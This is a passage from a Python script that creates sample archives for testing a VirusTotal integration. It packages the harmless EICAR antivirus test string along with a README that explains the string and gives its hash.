    ("eicar.com",    EICAR_STRING),
    ("eicar.txt",    EICAR_STRING),   # second copy for multi-hit demo
    ("README.txt",
        b"This archive is for testing the VirusTotal integration.\n"
        b"The file 'eicar.com' contains the EICAR standard antivirus test string.\n"
        b"It is harmless but will be flagged by all AV engines and VirusTotal.\n"
        b"SHA-256: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f\n"
    ),
]))


print("\nDone. 19 sample archives created in samples/")
